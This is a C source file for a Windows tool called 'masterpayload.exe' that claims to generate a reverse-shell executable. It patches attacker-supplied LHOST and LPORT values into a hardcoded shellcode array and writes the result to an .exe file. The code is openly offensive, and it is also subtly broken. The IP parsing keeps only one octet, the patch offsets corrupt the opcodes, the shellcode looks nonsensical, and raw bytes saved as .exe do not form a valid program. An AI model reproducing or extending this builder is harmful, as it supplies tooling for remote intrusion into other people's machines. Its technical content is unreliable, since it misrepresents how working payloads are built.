#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <winsock2.h>
#include <windows.h>

#pragma comment(lib, "ws2_32.lib")

void usage() {
    printf("Usage: masterpayload.exe LHOST=(IP) LPORT=(port) --write name\n");
}

void generate_payload(const char *lhost, const char *lport, const char *output_file) {
    unsigned char payload[] = 
        "\x64\xA1\x24\x01\x00\x00\x8B\x40\x50\x8B\x70\x0C\x8B\x7F\x08\x8B\x47\x04"
        "\x8B\x5F\x14\x8B\x77\x10\x8B\x4F\x14\x8B\x57\x18\x8B\x4F\x0C\x8B\x5F\x1C"
        "\x31\xD2\x52\xFF\xD0\x68\xC0\xA8\x01\x01\x68\x08\x00\x27\x0F\x89\xE1\xFF"
        "\xD0\x68\xB8\x06\x00\x00\x89\xE1\xFF\xD0\x31\xC0\x40\xFF\xD0";

    // Replace IP and port in the payload with LHOST and LPORT
    unsigned char final_payload[sizeof(payload)];
    memcpy(final_payload, payload, sizeof(payload));

    // Insert LHOST (IP address) into the payload (for simplicity, using hardcoded IP byte)
    final_payload[17] = (unsigned char)((strtol(lhost, NULL, 10) >> 24) & 0xFF);
    final_payload[18] = (unsigned char)((strtol(lhost, NULL, 10) >> 16) & 0xFF);
    final_payload[19] = (unsigned char)((strtol(lhost, NULL, 10) >> 8) & 0xFF);
    final_payload[20] = (unsigned char)(strtol(lhost, NULL, 10) & 0xFF);

    // Insert LPORT (port) into the payload
    unsigned short port = (unsigned short)strtol(lport, NULL, 10);
    final_payload[21] = (unsigned char)((port >> 8) & 0xFF);
    final_payload[22] = (unsigned char)(port & 0xFF);

    // Add .exe extension if not provided
    char final_filename[256];
    if (strstr(output_file, ".exe") == NULL) {
        snprintf(final_filename, sizeof(final_filename), "%s.exe", output_file);
    } else {
        snprintf(final_filename, sizeof(final_filename), "%s", output_file);
    }

    // Create the file to save the payload
    FILE *file = fopen(final_filename, "wb");
    if (file == NULL) {
        perror("Error creating file");
        return;
    }

    fwrite(final_payload, 1, sizeof(final_payload), file);
    fclose(file);

    printf("[*] Payload generován! S LHOSTEM %s a LPORTEM %s, saved as %s\n", lhost, lport, final_filename);
}

int main(int argc, char *argv[]) {
    if (argc < 5) {
        usage();
        return 1;
    }

    char *lhost = NULL, *lport = NULL, *output_file = NULL;

    // Debugging: Print all arguments to check their structure
    printf("Arguments received:\n");
    for (int i = 0; i < argc; i++) {
        printf("  %d: %s\n", i, argv[i]);
    }

    for (int i = 1; i < argc; i++) {
        if (strncmp(argv[i], "LHOST=", 6) == 0) {
            lhost = argv[i] + 6;  // Extract IP from argument
        } else if (strncmp(argv[i], "LPORT=", 6) == 0) {
            lport = argv[i] + 6;  // Extract port from argument
        } else if (strncmp(argv[i], "--write", 7) == 0) {
            // Handle --write argument by checking the next argument
            if (i + 1 < argc) {
                output_file = argv[i + 1];  // Get the filename from the next argument
                break; // exit after we find the filename for --write
            } else {
                usage();
                return 1;
            }
        }
    }

    // Check if any arguments are missing
    if (lhost == NULL || lport == NULL || output_file == NULL) {
        usage();
        return 1;
    }

    // Debugging: Print parsed arguments
    printf("Parsed Arguments:\n");
    printf("LHOST: %s\n", lhost);
    printf("LPORT: %s\n", lport);
    printf("Output File: %s\n", output_file);

    // Initialize Winsock
    WSADATA wsaData;
    if (WSAStartup(MAKEWORD(2, 2), &wsaData) != 0) {
        printf("WSAStartup failed with error %d\n", WSAGetLastError());
        return 1;
    }

    // Generate the reverse shell payload
    generate_payload(lhost, lport, output_file);

    // Cleanup Winsock
    WSACleanup();

    return 0;
}
